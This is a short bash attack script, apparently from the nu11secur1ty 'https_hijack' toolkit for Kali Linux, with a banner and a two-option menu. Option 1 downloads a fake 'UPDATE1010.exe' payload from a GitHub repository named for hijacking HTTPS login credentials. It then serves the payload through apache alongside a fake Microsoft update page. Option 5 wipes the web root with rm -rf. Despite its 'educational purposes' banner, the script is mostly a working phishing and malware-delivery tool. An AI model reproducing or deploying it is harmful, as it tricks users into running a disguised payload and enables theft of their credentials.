#!/usr/bin/bash
# nu11secur1ty mode 2019
# DEVELOPMENT by @nu11secur1ty Veresion 4.0 ...
# version Shimazu 0.1 code name https_hijack

echo -e '\e[1;32m

 :::::::: :::    ::::::::::::::::::    ::::     :::    ::::::::::::    ::: 
:+:    :+::+:    :+:    :+:    +:+:+: :+:+:+  :+: :+:       :+: :+:    :+: 
+:+       +:+    +:+    +:+    +:+ +:+:+ +:+ +:+   +:+     +:+  +:+    +:+ 
+#++:++#+++#++:++#++    +#+    +#+  +:+  +#++#++:++#++:   +#+   +#+    +:+ 
       +#++#+    +#+    +#+    +#+       +#++#+     +#+  +#+    +#+    +#+ 
#+#    #+##+#    #+#    #+#    #+#       #+##+#     #+# #+#     #+#    #+# 
######## ###    #################       ######     ############ ######## 
					For (Kali Linux) code name https_hijack
 						\e[1;34m
					by nu11secur1ty
                           
     Use ONLY FOR EDUCATIONAL PURPOSES!!! STAY LEGAL!!!
                                                \e[1;23m
If you do not want to use the program, please press Ctrl+C to exit.

---------------------------------------------------------------------------
[1] Windows - update.exe [payload and listener] 
[5]         - Cleaning
'

exe='1' 
cl='5'

read x

# 1
if [ "$x" == "$exe" ]; then 
wget https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/raw/master/Attacker/sh1mazu_https_fake/UPDATE1010.exe
cp UPDATE1010.exe /var/www/html
	cp -avr shimazu_module/Microupdate/* /var/www/html
	systemctl start apache2.service

# 5	
elif [ "$x" == "$cl" ]; then
	echo "Wait to clean..."
		sleep 3;
		systemctl stop apache2.service	
		rm -rf /var/www/html/*
		echo "Everything is clean ;)"
	fi
